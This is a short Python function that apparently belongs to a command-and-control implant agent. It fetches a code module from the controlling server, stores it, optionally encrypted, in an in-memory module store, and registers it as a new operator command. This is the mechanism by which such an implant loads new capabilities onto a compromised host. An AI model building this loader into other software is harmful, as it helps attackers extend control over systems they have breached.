def load(task_id, file_id, cmds):
    global responses
    code = reverse_upload(task_id, file_id)
    name = cmds

    if agent.encryption_key == "":
        dynfs[name] = code
    else:
        dynfs[name] = encrypt_code(code)



    response = {
            'task_id': task_id,
            "user_output": "Module successfully added",
            'commands': [
                {
                    "action": "add",
                    "cmd": name
                }
            ],
            'completed': True
        }

    responses.append(response)

    return